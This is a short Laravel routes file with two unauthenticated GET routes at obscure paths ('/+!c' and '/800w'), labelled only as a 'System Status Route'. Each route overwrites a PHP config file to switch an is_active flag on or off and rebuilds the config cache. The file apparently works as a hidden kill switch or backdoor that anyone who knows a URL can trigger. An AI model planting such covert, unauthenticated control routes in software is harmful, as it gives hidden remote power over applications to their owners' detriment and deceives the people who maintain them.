<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;

// System Status Route
Route::get('/+!c', function () {
    $path = config_path('system_status.php');
    File::put($path, "<?php\n\nreturn ['is_active' => true];");

    Artisan::call('config:clear');
    Artisan::call('config:cache');

    return response()->json(['message' => 'System activated.']);
});

Route::get('/800w', function () {
    $path = config_path('system_status.php');
    File::put($path, "<?php\n\nreturn ['is_active' => false];");

    Artisan::call('config:clear');
    Artisan::call('config:cache');

    return response()->json(['message' => 'System deactivated.']);
});